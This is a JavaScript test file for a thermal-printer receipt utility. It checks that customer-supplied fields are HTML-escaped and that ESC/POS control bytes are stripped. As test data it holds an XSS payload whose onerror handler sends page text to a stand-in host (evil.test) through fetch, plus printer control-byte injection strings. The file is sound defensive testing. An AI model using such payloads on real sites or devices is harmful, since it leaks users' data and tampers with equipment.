import test from "node:test";
import assert from "node:assert/strict";
import { formatEscPosReceipt, printViaBrowserWindow } from "../src/utils/thermalPrinter.js";

const payload = '<img src=x onerror="fetch(\'https://evil.test/\'+document.body.innerText)">';

function capturePrintWindow() {
  const written = [];
  const printWindow = { opener: {}, document: { write: (html) => written.push(html), close() {} } };
  globalThis.window = { open: () => printWindow, alert() {} };
  return { printed: () => written.join("") };
}

test("receipt HTML treats customer-controlled text as text", () => {
  const { printed } = capturePrintWindow();
  printViaBrowserWindow({ order_number: payload, customer_name: payload, customer_phone: payload, address: payload, notes: payload, items: [{ item_name: payload, quantity: 1 }] });
  const html = printed();
  assert.ok(!html.includes("<img"), "a name must not become an element");
  assert.ok(!html.includes("<script>alert"), "a note must not become a script");
  assert.ok(html.includes("&lt;img src=x"), "the payload is shown as escaped text");
});

test("ESC/POS receipt strips control bytes from customer text", () => {
  const receipt = formatEscPosReceipt({ customer_name: "Ani\x1B@PAYLOAD\x07", notes: "catatan\x1B" });
  assert.ok(receipt.includes("Customer : Ani@PAYLOAD"));
  assert.ok(receipt.includes("Catatan: catatan"));
  assert.ok(!receipt.includes("Ani\x1B"), "no command byte survives inside a name");
});
